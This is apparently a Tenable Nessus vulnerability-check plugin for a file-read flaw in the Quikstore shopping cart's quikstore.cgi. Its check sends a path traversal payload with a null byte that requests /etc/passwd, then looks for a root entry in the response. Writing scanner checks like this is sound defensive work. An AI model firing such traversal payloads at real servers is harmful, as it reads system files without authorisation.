#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10712);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-1999-0607", "CVE-2000-1188");
 script_bugtraq_id(1983);
 script_osvdb_id(590, 6466);
 
 script_name(english:"Quikstore Shopping Cart quikstore.cgi Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files can be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The CGI 'quickstore.cgi' is installed. This CGI has a well known 
security flaw that lets an attacker read arbitrary files with the 
privileges of the HTTP daemon." );
 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin or upgrade to the latest version." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/08/04");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/04/20");
 script_cvs_date("$Date: 2011/03/14 21:48:11 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Checks for the presence of /cgi-bin/quickstore.cgi");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "webmirror.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
req = string(dir,
 "/quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=");
r = http_send_recv3(method: "GET", item:req, port:port);
if (isnull(r)) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string: r[0]+r[1]+r[2]))
security_warning(port, extra: 
strcat('\nThe following URL exhibits the flaw :\n', build_url(port: port, qs: req)));
}
